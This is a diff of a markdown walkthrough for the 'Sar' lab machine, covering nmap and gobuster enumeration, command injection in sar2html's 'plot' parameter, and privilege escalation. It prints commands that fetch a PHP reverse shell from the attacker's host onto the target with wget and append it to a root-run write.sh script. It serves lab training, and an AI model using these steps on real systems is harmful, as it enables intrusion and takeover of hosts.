@@ -1,22 +1,5 @@
-Sar
+# Sar
 
-## Methodology and summary
-## Table of Contents
-1. [Information Gathering]()
-	1.1. [Discovery host]()
-	1.2. [Service Enum]()
-	1.3. [Web]()
-		1.3.1. [Gobuster]()
-		1.3.2. [1.3.2 Robots.txt and Sar2html]()
-
-2. [Exploitation]()
-	2.1 [2.2 Coded exploit to gain RCE]()
-
-3. [Post exploitation]()
-	3.1. [First user]()
-	3.2. [Getting root with openssl]()
-
----
 # 1 Information gathering
 ## 1.1 Discovery host
 `nmap -Pn -F 192.168.196.1/24 -oN host_discovery.txt`
@@ -28,6 +11,7 @@ Sar
 ![99077d6337566a9dacfab871978e6f68.png](./_resources/ceac9e71650746b3b84bffa8119c058c.png)
 
 `nmap -sV -sU -F  -oN udp-sC-sV.txt`
+
 ![b5040109f53646d85e2ba4b39ab82df1.png](./_resources/e22b29ee7b444b57abe4e663f9ac0a1a.png)
 
 ## 1.3 Web
@@ -37,6 +21,7 @@ Sar
 ### 1.3.2 Robots.txt and Sar2html
 ![fefda24968698a6f7a9db52a94e6cd60.png](./_resources/d4db09a2e93e4504aecaf68778e4bc31.png)
 ![10734a64042b69ed98f6b07cf2684102.png](./_resources/936510b6e8f74c6b8af7146f059f0abe.png)
+
 For this app there are public exploits, but let's code it.
 
 # 2 Exploitation (Testing for Command Injection - WSTG-INPV-12)
@@ -44,6 +29,7 @@ For this app there are public exploits, but let's code it.
 Firts we should know what point of the source code is vulnerable:
 ![2824569ae5baa951aacf73ee2dc796eb.png](./_resources/2b1aa54a0f5c49d283aba80292cc012c.png)
 ![ea782e47d8895a5985e6d0f4356bcef0.png](./_resources/b1c080a4aea34f0a9b6743cf8879b46b.png)
+
 The variable `plot` receive as GET method and concatenated into php vulnerable exec function. The argument for this command must be sanitized
 
 Code:
@@ -105,8 +91,11 @@ main()
 
 ## 2.2 PHP Reverse shell
 https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+
 Download and edit the php reverse shell for point your ip and port.
+
 `python3 -m http.server 8090` <- on the platform
+
 `wget http://192.168.196.121:8090/php-reverse-shell.php` <- on the target for rev shell download
 
 Now you might execute it:
@@ -120,7 +109,10 @@ LinEnum.sh reveals some good information:
 ![5151113f8bd7b5dfaac69486e06e73e0.png](./_resources/a17774987f9349c4b8202d74fc6d4f02.png)
 
 Let's edit write.sh file to gain shell:
+
 `python3 -m http.server 8090` <- on the kali
+
 `wget http://192.168.196.121:8090/php-reverse-shell.php` <- on the target
+
 `echo "php ./php-reverse-shell.php" >> write.sh` <- on the target
 ![54a351a9644ded50d5cf9af4934e55cb.png](./_resources/d23c9d3441f24410827b583b35e0f9c1.png)
